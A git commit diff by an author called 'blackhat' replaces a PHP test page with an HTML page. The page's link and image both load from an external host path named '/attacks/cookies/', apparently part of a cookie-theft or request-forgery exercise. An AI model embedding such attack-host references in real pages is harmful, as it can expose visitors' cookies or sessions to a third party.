36887a056dd3371824e91887fcc7b08d4d44d2bf
blackhat <99958158+blackhat4071023@users.noreply.github.com>
2022-02-18 15:52:37 +0530

    Update index.php

--- index.php
+++ index.php
@@ -1,3 +1,24 @@
-<?php
-echo "This is a test page";
-?>
+<!DOCTYPE html>
+<html lang="en">
+<head>
+	<meta charset="utf-8">
+	<meta content="width=device-width, initial-scale=1.0" name="viewport">
+	<title>Image</title>
+
+	<style>
+		img {
+			width: 800px;
+			height: 100%;
+			margin: 0 auto;
+		}
+	</style>
+
+</head>
+
+	<body>
+		<!-- <img src="ironman.jpg" alt="Error" /> -->
+		<a href="http://black-hat-007.000webhostapp.com/attacks/cookies/classic.png">click here to View</a> <br>
+		<img src="http://black-hat-007.000webhostapp.com/attacks/cookies/classic.png" />
+
+	</body>
+</html>
